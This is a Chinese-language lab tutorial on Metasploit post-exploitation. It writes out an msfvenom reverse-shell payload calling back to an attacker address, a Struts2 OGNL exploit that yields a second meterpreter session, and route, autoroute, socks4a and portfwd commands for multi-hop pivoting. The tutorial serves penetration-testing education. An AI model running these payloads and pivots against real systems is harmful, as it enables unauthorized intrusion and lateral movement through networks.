第9.3节 msf后渗透

第一步: 获取到目标1的meterpreter


1.1 反弹一个meterpreter到攻击者


msfvenom -p windows/meterpreter/reverse_tcp -f exe --platform windows -a x86 -e generic/none LHOST=192.168.122.4 LPORT=443 > '/root/1.exe'
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.122.4
set LPORT 443
run -j


第二步: 在目标1中进行代理访问


2.1 添加route路由


route add 192.168.141.0 255.255.255.0 1
此时，metapsloit对子网192.168.141.0进行扫描(db_nmap)或者访问(psexe模块,ssh模块)将通过session 1这个会话来代理访问。

2.1.1 在meterpreter上操作


run post/windows/gather/arp_scanner RHOSTS=192.168.141.128/24

必须是post的模块，这样才可以指定session

2.2 添加proxy代理


2.2.1 socks4a代理


use auxiliary/server/socks4a
exploit -j
由于，只有metasploit通过session1这个会话进行代理是不够的，想要其他应用程序也可以使用这个代理，可以通过metaspliot socks4a提供的一个监听隧道提供其他应用程序访问。

2.2.2 配置proxychains


vim /etc/proxychains.conf
socks4 127.0.0.1 1080

2.2.3 使用代理


proxychains nmap -sT -sV -Pn -n 192.168.141.128
proxychains firefox http://172.16.250.10/kittens/overview/

第三步: 攻击目标2获取目标2的权限


现在已经通过session 1代理进入了192.168.141.0/24网段,并可以使用其他工具来访问这个网段的主机,经过一系列的信息收集和漏洞分析。发现192.168.141.128存在漏洞。

3.1 metasploit获取目标2权限


由于metasploit已经是通过session 1代理进入了目标2所在网段，所以可以直接利用。
use exploit/multi/http/struts2_content_type_ognl
set payload linux/x86/meterpreter/reverse_tcp
set lhost 192.168.122.4
set rhost 192.168.141.128
set rport 80
反弹得到meterpreter的session 2

3.2 session2上添加route


在目标2上发现，在192.168.141.0/24网段中，由于防火墙的设置，只有192.168.141.128可以访问，所以需要在目标2上添加一个代理。
meterpreter > run autoroute -s 192.168.141.128 -n 255.255.255.0
此时，访问http://192.168.141.128:8080, 就是通过了session 1和session 2两层代理。
proxychains firefox http://192.168.141.128:8080
访问成功！

3.3 portfwd


在session2上删除route
run autoroute -d -s 192.168.141.128
我们发现无法删除run autoroute -d -s 192.168.141.0，因为我们session2是在这个路由的基础上完成的。

此时，我们在session2上添加端口转发。
meterpreter > portfwd add -l 1234 -r 172.16.250.30 -p 8080

第四步: 总结


network-lab完成了利用meterpreter进行内网渗透的关键手段，利用route进行pivot，以及如何进行多级代理。利用portfwd进行端口转发。
